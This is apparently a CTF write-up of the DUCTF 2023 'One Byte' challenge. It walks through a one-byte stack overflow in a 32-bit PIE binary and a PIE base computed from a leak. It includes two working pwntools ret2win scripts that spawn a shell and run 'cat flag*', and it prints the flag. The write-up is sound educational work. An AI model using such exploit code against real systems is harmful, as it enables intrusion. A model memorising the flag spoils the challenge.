<h3> DUCTF 2023: One Byte </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/68d8d008-53af-4ba1-b5ca-64e8631ff0ff)

We are given the binary and it's source code

Here's the C source:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/815e5671-519a-4466-85f4-11747e60342d)

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void init() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

void win() {
    system("/bin/sh");
}

int main() {
    init();

    printf("Free junk: 0x%lx\n", init);
    printf("Your turn: ");

    char buf[0x10];
    read(0, buf, 0x11);
}
```

Looking at it we can see the program doesn't do much!

Here's what it does:
- Defines 3 functions i.e init, win, main
- The init function does some buffering
- The win function tends to spawn a sh shell
- The main function gives us a binary leak of the init function
- Then it receives our input and store in the buf array

The vulnerability lies in the read call because:
- The buffer is set to hold up only `0x10` bytes
- But we are reading in `0x11`

That gives us a one byte buffer overflow

At first I was like this is too easy cause there's a win function and what the hell is the leak for?

Trust me it's easy but I spent about an hour solving it lol

From this vuln we know the idea is exploiting one byte overflow to a jump to the win function which would spawn a shell

Checking the file type and protection enabled showed this:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/84c35a71-5921-4dae-88e2-60fa70f9c9b0)

We are working with a 32bit binary which is dynamically linked and not stripped

The only protection not enabled is `Stack Canary`

Let us run the binary to see how it behaves
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f3ee4ad9-6593-464f-a76a-a3c7784bb8f8)

It is as we saw from the source code! 

I was still wondering why they gave us a elf section leak 🤔

Don't mind that I have lot of skill isses :(

![skillissue-skill](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/050f0dcf-b2e7-4ede-a2e7-426ffa0f6630)

Ok back to the challenge, I have done at least 2 `one byte overflow` before but it was on a x64 binary so solving this really taught me something new

I decided to check out the overflow using `gdb-gef`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3c3cb7ec-7dd4-4f9f-a38e-f9d4e1be01e0)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dc16b498-4864-411e-8d7c-c19115751a69)

Looking at that we can see that I inputted 17 A's which is the amount of bytes required to perform the one byte overwrite

And from the result on our current instruction pointer which is the `eip` it is pointing to `0x41565562` 

This is where I starter getting confused

And the reason is becasue I'm used to seeing addresses being in form of Little Endian when I do one byte overflow i.e `0x56565541`

Note: The way I solved this is based on logic I don't really know `why` it works like that 🥲

So if we take a look at the current address of the win function we will see this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b42d7c56-b2a8-43ea-9e58-0e5b095544f1)

Because PIE is enabled it will always change during the program execution

And from our one byte overflow the address is giving `0x41565562` instead of `0x56565541`

That means our one byte overflow is just overwriting the first byte of the address and not the last

This is bad because how would we want to change the EIP to point to the win function when we can just only overwrite the first byte and not the last

I spent time figuring what to do but couldn't think of anything so I decided to look at what each character does when I overflow with it

That kinda sounds dumb like why is that important? To be honest I don't know 😂

So using this input I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9f3dd4b2-3155-44dc-83ac-d4c5eeff0bc1)

```python
'A'*16 + 'B'
```

Hmm interesting! Notice that the EIP has been overwritten with two bytes

I followed that pattern using another set of character
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/16485df6-7848-427d-b88c-87657202f028)

```python3
'A'*16 + 'C'
```

Wow again? We have overwritten 3 bytes just by using the third alphabet `C`

I did it for letter `D` and boom we have full control over the EIP
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2421948c-4eac-4fbd-a28f-9a9c09217d39)

This is cool because we having total control over the EIP therefore can make us change the program execution to call any function and in this case we would want to call the `win` function

But we need two things:
- The exact location of where our input which is overwriting the EIP is
- A way to get the win function address because PIE is enabled it will always change

The first and second case are easy to get:

For the first case since we know that in x86 binaries the memory address are 4 bytes alligned meaning we can therefore split our payload into fours i.e 'A'*4 + 'B'*4 etc.. 

Doing that I got the position to be the first 4 bytes of our input
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bf4e3e80-c3ed-4ec9-900a-90b73e1a33a2)

```python
'A'*4 + 'B'*4 + 'C'*4 + 'D'*4 + 'D'
```

Cool so now instead of the EIP should be filled with A's we can fill it with the win function address 😎

About the win function address how do we get it since it will always change when the program runs??

Well come to think of it we were given an ELF section leak

Meaning that we can calculate the elf base address via that leak

When I check vmmap I get the start address of the elf binary
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/af66b8d3-8b71-4b87-8594-88cc990cde46)

The idea I usually use in calculating leaks is this:

```
leak - (known leak - elf base)
```

That basically will just subtract the leak with the offset to the elf base address

Now that we know that here's my solve script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings
filterwarnings('ignore')

context.update(arch='i386')
exe = './onebyte'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
piebase
break *main+110
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.recvuntil('Free junk:')
init = int(io.recvline().strip().decode(), 16)
elf.address = init - (0x565561bd - 0x56555000)
log.info("Elf base address: 0x%x", elf.address)
log.info("Jumping to address: 0x%x", elf.sym['win'])

payload = p32(elf.sym['win']) + b'A'*4 + b'B'*4 + b'C'*4 + b'D'

io.recvuntil('Your turn:')
io.send(payload)

io.interactive()
```

But when I ran it uhmmm it works and fails 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/754a5f54-5a6d-43b8-8981-14488dded912)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2ac246c9-f9cc-4d68-8476-6669eaf7b6a9)

Initially it took a long time before I noticed it works but then fails multiple times

When I then debugged why this is so I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/53cfddd1-2344-4c09-a563-713376b5b4ce)

After the program is about to return it will jump to `IO_file_setbuf` instead of `win`

I don't know why that's happening but it sometimes jumps to `_GLOBAL_OFFSET_TABLE` or `0x0` 

So the way I ended up solving this is by running it in a loop then hopefully when it spawns a shell in one of the loop process it will `cat` the flag

Here's my solve script

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings
filterwarnings('ignore')

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './onebyte'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'INFO'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
piebase
break *main+110
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

for i in range(20):
    try:
        io = start()
        #io = remote('2023.ductf.dev', '30018')

        # Leak & Calculate ELF Base Address
        io.recvuntil('Free junk:')
        init = int(io.recvline().strip().decode(), 16)
        elf.address = init - (0x565561bd - 0x56555000)
        log.info("Elf base address: 0x%x", elf.address)
        log.info("Jumping to address: 0x%x", elf.sym['win'])

        # Ret2Win Payload
        payload = p32(elf.sym['win']) + b'A'*4 + b'B'*4 + b'C'*4 + b'D'

        io.recvuntil('Your turn:')
        io.send(payload)
        io.sendline('cat flag*')
        res = io.recvline().decode()
        log.info(f"Flag: {res}")
        io.close()
    except Exception:
        pass
```

Running it locally works (that's a fake flag I made for local testing)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5f4cb4fd-d2aa-4957-b25a-3271a0f91f96)

On running it remotely works also :P
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9c91664b-2401-41bb-9c15-21a0f8e3b2ae)

To make the script work remotely uncomment the `io` variable and comment `io = start()`

```
Flag: DUCTF{all_1t_t4k3s_is_0n3!}
```
